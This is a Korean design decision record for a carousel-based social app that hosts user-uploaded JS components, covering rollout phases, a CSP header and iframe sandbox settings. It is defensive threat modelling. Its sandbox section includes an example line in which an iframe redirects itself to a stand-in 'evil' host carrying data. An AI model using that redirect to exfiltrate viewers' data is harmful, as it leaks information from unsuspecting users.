# carousel SNS 화 (결정 기록, 2026-10-15)

게시물이 이미지가 아니라 돌아가는 웹 조각인 인스타그램. 차별점은 글·사진 말고
**JS 컴포넌트를 올릴 수 있다**는 것. 공개 서비스지만 MVP 라 신고·삭제·악성 코드
대응은 뺀다. 샌드박스는 최소한 둔다.

## 정한 것

- 게시물 단위는 지금과 같은 캐러셀(1080×1350 장 여러 개). 편집기·덱 모델·코드
  레이어·Supabase 인증은 그대로 쓴다.
- 남의 컴포넌트를 내 게시물에 가져다 쓰는 것(리믹스)은 우선 지원하지 않는다.
  그래서 게시물 하나를 통째로 iframe 하나에 넣으면 된다.
- 사회적 기능은 좋아요·댓글로 시작한다.
- 코드는 정체성이라 빼지 않는다. 다만 순서를 뒤로 둔다(아래 2단계).
- 남의 코드는 **보는 사람 브라우저에서 바깥으로 요청이 나갈 길을 전부 닫는다.**
  `connect-src 'none'` 만으로는 모자라다(img·font·css
  url()·form·dns-prefetch·자기 이동).

## 순서 (단계마다 따로 내보낸다)

| 단계                | 내용                                                                                                                                           | 어림  |
| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | ----- |
| 1. 공개 링크        | 덱에 "공개" 스위치, `/p/<id>` 에서 누구나 봄. 보기 전용 뷰어를 별도 origin 의 샌드박스 iframe 에 넣고 CSP 로 네트워크 차단. 스토리지 공개 읽기 | 4~5일 |
| 2. 코드 창          | 편집기에 코드 레이어 편집 창(CodeMirror)과 오류 표시. 편집하는 사람은 자기 코드라 샌드박스 불필요, 샌드박스는 뷰어에만                         | 2~3일 |
| 3. 피드·좋아요·댓글 | 최근순 피드, 프로필(이름·핸들), 좋아요·댓글 표와 RLS, UI                                                                                       | 4~5일 |

소개 시점은 1단계 끝. 지금은 로그인해야 뭐든 보여서 소개해도 보여 줄 게 없다.
1단계만 끝나도 캐러셀이 링크로 공유되는 웹페이지가 되어 인스타 프로필·글에 걸 수
있다.

## 뷰어 샌드박스

뷰어 origin 응답 헤더:

```
Content-Security-Policy: default-src 'none'; script-src 'self' blob:; style-src 'self' 'unsafe-inline';
  img-src <우리 스토리지> data: blob:; font-src 'self'; form-action 'none'; base-uri 'none'
Referrer-Policy: no-referrer
X-DNS-Prefetch-Control: off
```

iframe 은 `sandbox="allow-scripts"` 만. `allow-same-origin`·`allow-popups`·
`allow-top-navigation` 은 절대 주지 않는다. `.yeolyi.com` 쿠키에 민감한 값을
두지 않는다(테마 쿠키만 있다).

남는 구멍: iframe 이 **자기 자신을 이동**하는 건 sandbox 가 못 막는다
(`location.href = "https://evil/?data"`). 부모가 iframe 의 `load` 이벤트를
받으면 그 게시물을 내리고 "이동을 시도한 컴포넌트"로 표시한다. 첫 요청 하나는
이미 나간 뒤라 완전한 차단은 아니다. MVP 에선 이 선까지.

네트워크를 안 막으면 생기는 일(막는 이유): 보는 사람 추적(IP·지문), 피싱 폼의
입력값 전송, 보는 사람 브라우저를 빌린 대리 요청, 올린 뒤 외부 스크립트로 내용
바꿈, 우리 Supabase 를 보는 사람 수만큼 두드리기. 정적 데이터는 올릴 때 에셋으로
같이 올리고, 실시간 데이터는 나중에 허용 목록으로 연다.

## 1단계에서 정할 것

- 뷰어 origin: `carousel-view.yeolyi.com` 같은 서브도메인으로 되는지, 쿠키
  때문에 아예 다른 도메인이 나은지.
- 공개 덱의 이미지: 공개 버킷으로 복사할지, 버킷 자체를 공개 읽기로 바꿀지.
- `/p/<id>` 를 지금 carousel 앱 안에 둘지.
